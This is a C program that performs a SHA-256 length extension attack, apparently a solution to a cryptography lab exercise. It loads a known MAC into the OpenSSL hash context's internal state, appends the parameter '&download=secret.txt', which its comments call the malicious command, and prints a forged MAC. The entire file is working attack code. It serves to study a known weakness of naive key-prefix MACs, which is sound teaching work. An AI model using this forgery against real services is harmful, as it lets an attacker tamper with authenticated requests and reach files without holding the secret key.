#include <stdio.h>
#include <string.h>
#include <openssl/sha.h>
#include <endian.h>

int main(int argc, const char *argv[])
{
    int i;
    unsigned char buffer[SHA256_DIGEST_LENGTH];
    SHA256_CTX c;

    // 1. Initialize the SHA256 context
    SHA256_Init(&c);

    // 2. Simulate the processing of the first 64-byte block.
    // The internal counter needs to be at 64 bytes because the original 
    // message (Key + R + Padding) was exactly one block long.
    for(i=0; i<64; i++)
        SHA256_Update(&c, "*", 1);

    // 3. Hijack the internal state (Chaining Variables).
    // We replace the default initial values with your specific MAC:
    // 9d57da26 4fb965b6 5ae79552 ce4db2c0 926c28d0 9533b12a c15a73dc 6d0776d3
    // htole32 ensures the byte order is correct for the internal SHA structure.
    c.h[0] = htole32(0x9d57da26);
    c.h[1] = htole32(0x4fb965b6);
    c.h[2] = htole32(0x5ae79552);
    c.h[3] = htole32(0xce4db2c0);
    c.h[4] = htole32(0x926c28d0);
    c.h[5] = htole32(0x9533b12a);
    c.h[6] = htole32(0xc15a73dc);
    c.h[7] = htole32(0x6d0776d3);

    // 4. Append the malicious command.
    // Since we hijacked the state, SHA256 continues hashing from where 
    // the original request left off.
    const char *extra_msg = "&download=secret.txt";
    SHA256_Update(&c, extra_msg, strlen(extra_msg));

    // 5. Finalize the hash to produce the new forged MAC.
    SHA256_Final(buffer, &c);

    // 6. Print the result in hexadecimal format.
    printf("New Forged MAC: ");
    for(i = 0; i < 32; i++) {
        printf("%02x", buffer[i]);
    }
    printf("\n");

    return 0;
}
